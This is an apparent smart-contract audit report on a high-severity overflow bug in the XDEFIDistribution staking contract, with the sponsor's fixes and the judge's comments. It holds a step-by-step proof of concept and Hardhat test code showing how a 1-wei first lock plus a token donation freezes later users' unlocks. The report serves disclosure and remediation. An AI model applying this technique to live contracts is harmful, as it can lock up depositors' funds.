[H-01] Malicious early user/attacker can malfunction the contract and even freeze users’ funds in edge cases
Submitted by WatchPug
https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L151-L151
_pointsPerUnit+= ((newXDEFI*_pointsMultiplier) /totalUnitsCached);
In the current implementation,_pointsPerUnitcan be changed inupdateDistribution()which can be called by anyone.
A malicious early user canlock()with only1 weiof XDEFI and makes_pointsPerUnitto be very large, causing future users not to be able tolock()and/orunlock()anymore due to overflow in arithmetic related to_pointsMultiplier.
As a result, the contract can be malfunctioning and even freeze users’ funds in edge cases.
Proof of Concept
Given:
bonusMultiplierOf[30 days] = 100Alicelock()1 weiof XDEFI for 30 days as the first user of the contract. Got1units, andtotalUnitsnow is1;Alice sends170141183460469 weiofXDEFIto the contract and callsupdateDistribution():
_pointsPerUnit+= ((170141183460469*2**128) /1);
Bob tries tolock()1,100,000 * 1e18ofXDEFIfor 30 days, the tx will fail, as_pointsPerUnit * unitsoverlows;Boblock()1,000,000 * 1e18ofXDEFIfor 30 days;The rewarder sends250,000 * 1e18ofXDEFIto the contract and callsupdateDistribution():
_pointsPerUnit+= ((250_000*1e18*2**128) / (1_000_000*1e18+1));
30 days later, Bob tries to callunlock(), the tx will fail, as_pointsPerUnit * unitsoverflows.
Recommended Mitigation Steps
Uniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.
The same solution should work here, i.e., on constructor set an initial amount (like 1e8) fortotalUnits
https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L39-L44
constructor(addressXDEFI_,stringmemorybaseURI_,uint256zeroDurationPointBase_)ERC721("Locked XDEFI","lXDEFI") {require((XDEFI=XDEFI_) !=address(0),"INVALID_TOKEN");owner=msg.sender;baseURI=baseURI_;_zeroDurationPointBase=zeroDurationPointBase_;totalUnits=100_000_000;}
deluca-mike (XDEFI) confirmed:
This is a great catch! I just tested it:const{expect} =require("chai");const{ethers} =require("hardhat");consttotalSupply='240000000000000000000000000';consttoWei= (value,add=0,sub=0)=>(BigInt(value) *1_000_000_000_000_000_000n+BigInt(add) -BigInt(sub)).toString();describe("XDEFIDistribution", ()=>{it("Can overflow _pointsPerUnit",async()=>{const[god,alice,bob] =awaitethers.getSigners();constXDEFI=await(await(awaitethers.getContractFactory("XDEFI")).deploy("XDEFI","XDEFI",totalSupply)).deployed();constXDEFIDistribution=await(await(awaitethers.getContractFactory("XDEFIDistribution")).deploy(XDEFI.address,"https://www.xdefi.io/nfts/",0)).deployed();// Give each account 2,000,000 XDEFIawait(awaitXDEFI.transfer(alice.address,toWei(2_000_000))).wait();await(awaitXDEFI.transfer(bob.address,toWei(2_000_000))).wait();// bonusMultiplierOf[30 days] = 100await(awaitXDEFIDistribution.setLockPeriods([2592000], [100])).wait();// 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1;await(awaitXDEFI.connect(alice).approve(XDEFIDistribution.address,1)).wait();await(awaitXDEFIDistribution.connect(alice).lock(1,2592000,alice.address)).wait();expect(awaitXDEFIDistribution.balanceOf(alice.address)).to.equal('1');constnft1= (awaitXDEFIDistribution.tokenOfOwnerByIndex(alice.address,0)).toString();expect((awaitXDEFIDistribution.positionOf(nft1)).units).to.equal(1);// 2. Alice sends 170141183460469 wei of XDEFI to the contract and calls updateDistribution()await(awaitXDEFI.connect(alice).transfer(XDEFIDistribution.address,170141183460469)).wait();await(awaitXDEFIDistribution.connect(alice).updateDistribution()).wait();// 3. Bob tries to lock() 1,100,000 * 1e18 of XDEFI for 30 days, the tx will fail, as _pointsPerUnit * units overflowsawait(awaitXDEFI.connect(bob).approve(XDEFIDistribution.address,toWei(1_100_000))).wait();awaitexpect(XDEFIDistribution.connect(bob).lock(toWei(1_100_000),2592000,bob.address)).to.be.revertedWith("_toInt256Safe failed");// 4. Bob lock() 1,000,000 * 1e18 of XDEFI for 30 daysawait(awaitXDEFI.connect(bob).approve(XDEFIDistribution.address,toWei(1_000_000))).wait();await(awaitXDEFIDistribution.connect(bob).lock(toWei(1_000_000),2592000,bob.address)).wait();expect(awaitXDEFIDistribution.balanceOf(bob.address)).to.equal('1');constnft2= (awaitXDEFIDistribution.tokenOfOwnerByIndex(bob.address,0)).toString();expect((awaitXDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(1_000_000));// 5. The rewarder sends 250,000 * 1e18 of XDEFI to the contract and calls updateDistribution()await(awaitXDEFI.transfer(XDEFIDistribution.address,toWei(250_000))).wait();await(awaitXDEFIDistribution.updateDistribution()).wait();// 6. 30 days later, Bob tries to call unlock(), the tx will fail, as _pointsPerUnit * units overflows.awaithre.ethers.provider.send('evm_increaseTime', [2592000]);awaitexpect(XDEFIDistribution.connect(bob).unlock(nft2,bob.address)).to.be.revertedWith("_toInt256Safe failed");});});While I do like the suggestion to tototalUnits = 100_000_000;in the constructor, it will result “uneven” numbers due to thetotalUnitsoffset. I wonder if I can resolve this but just reducing_pointsMultipliertouint256(2**96)as perhttps://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728.
deluca-mike (XDEFI) commented:
OK, I think I can solve this with_pointsMultiplier = uint256(2**72):const{expect} =require("chai");const{ethers} =require("hardhat");consttotalSupply='240000000000000000000000000';consttoWei= (value,add=0,sub=0)=>(BigInt(value) *1_000_000_000_000_000_000n+BigInt(add) -BigInt(sub)).toString();describe("XDEFIDistribution", ()=>{it("Can overflow _pointsPerUnit",async()=>{const[god,alice,bob] =awaitethers.getSigners();constXDEFI=await(await(awaitethers.getContractFactory("XDEFI")).deploy("XDEFI","XDEFI",totalSupply)).deployed();constXDEFIDistribution=await(await(awaitethers.getContractFactory("XDEFIDistribution")).deploy(XDEFI.address,"https://www.xdefi.io/nfts/",0)).deployed();// Give each account 100M XDEFIawait(awaitXDEFI.transfer(alice.address,toWei(100_000_000))).wait();await(awaitXDEFI.transfer(bob.address,toWei(100_000_000))).wait();// bonusMultiplierOf[30 days] = 255await(awaitXDEFIDistribution.setLockPeriods([2592000], [255])).wait();// 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1await(awaitXDEFI.connect(alice).approve(XDEFIDistribution.address,1)).wait();await(awaitXDEFIDistribution.connect(alice).lock(1,2592000,alice.address)).wait();expect(awaitXDEFIDistribution.balanceOf(alice.address)).to.equal('1');constnft1= (awaitXDEFIDistribution.tokenOfOwnerByIndex(alice.address,0)).toString();expect((awaitXDEFIDistribution.positionOf(nft1)).units).to.equal(2);// 2. Alice sends 100M XDEFI minus 1 wei to the contract and calls updateDistribution()await(awaitXDEFI.connect(alice).transfer(XDEFIDistribution.address,toWei(100_000_000,0,1))).wait();await(awaitXDEFIDistribution.connect(alice).updateDistribution()).wait();// 3. Bob can lock() 100M XDEFI for 30 daysawait(awaitXDEFI.connect(bob).approve(XDEFIDistribution.address,toWei(100_000_000))).wait();await(awaitXDEFIDistribution.connect(bob).lock(toWei(100_000_000),2592000,bob.address)).wait();expect(awaitXDEFIDistribution.balanceOf(bob.address)).to.equal('1');constnft2= (awaitXDEFIDistribution.tokenOfOwnerByIndex(bob.address,0)).toString();expect((awaitXDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(255_000_000));// 4. The rewarder sends 40M XDEFI to the contract and calls updateDistribution()await(awaitXDEFI.transfer(XDEFIDistribution.address,toWei(40_000_000))).wait();await(awaitXDEFIDistribution.updateDistribution()).wait();// 5. 30 days later, Bob can call unlock()awaithre.ethers.provider.send('evm_increaseTime', [2592000]);await(awaitXDEFIDistribution.connect(bob).unlock(nft2,bob.address)).wait();});});
deluca-mike (XDEFI) commented:
In therelease candidate contract, in order to preserve the math (formulas), at the cost of some accuracy, we went with a_pointsMultiplierof 72 bits.Also, aminimum units lockedis enforced, to prevent “dust” from creating a very very high_pointsPerUnit.Tests were written in order to stress test the contract against the above extreme cases.Further, a “no-going-back”emergency mode setterwas implemented that allows (but does not force) users towithdraw only their depositswithout any of the funds distribution math from being expected, in the event that some an edge case does arise.
Ivshti (Judge) commented:
fantastic finding, agreed with the proposed severity!The sponsor fixes seem adequate: a lower_poinsMultiplier, a minimum lock and an emergency mode that disables reward math, somewhat similar to emergency withdraw functions in contracts like masterchef.